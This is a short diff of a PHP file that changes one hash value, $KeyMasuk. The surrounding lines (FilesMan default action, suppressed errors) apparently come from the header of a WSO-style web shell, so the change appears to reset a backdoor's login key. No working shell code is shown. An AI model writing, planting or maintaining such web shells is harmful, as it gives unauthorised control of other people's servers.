@@ -17,7 +17,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$KeyMasuk = "29fd0106e6d191f88c75d5c99b903aff";
+$KeyMasuk = "f55fc9719a066603197dfe4a184d906b";
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
